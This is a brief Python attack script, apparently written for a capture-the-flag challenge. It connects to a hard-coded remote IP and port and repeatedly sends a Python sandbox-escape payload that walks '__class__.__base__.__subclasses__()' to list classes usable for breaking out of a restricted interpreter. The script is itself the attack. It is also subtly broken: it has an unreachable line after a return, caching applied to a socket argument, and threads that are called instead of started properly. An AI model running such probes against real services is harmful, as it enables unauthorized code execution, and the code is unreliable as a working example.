import socket, threading
from functools import lru_cache


HOST, PORT = '138.68.148.149', 30844


def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.connect((HOST, PORT))
	_ = s.recv(1024)
	return s
	s = connect()


@lru_cache(maxsize=None, typed=True)
def s1mple(s:socket.SocketType):
	for i in range(100):

		p = f'[print(x) for x in [[().__class__.__base__.__subclasses__()[{i}]]]]\n'
		
		s.sendall(bytes(p, 'utf8'))
		d = s.recv(8096).replace(b'\n', b'').decode().split('>>>')[0]
		print(f'[*] {d} : {i}')
		if i % 2 or s.fileno() == -1:
			s = connect()


#MULTITHREADING:
threads, _THREADS_ = [], 4
if __name__ == "__main__":
	s = connect()
	print(s)
	for _ in range(_THREADS_):
		t = threading.Thread(target=s1mple(s))
		t.start()
		threads.append(t)

	for thread in threads:
		thread.join()

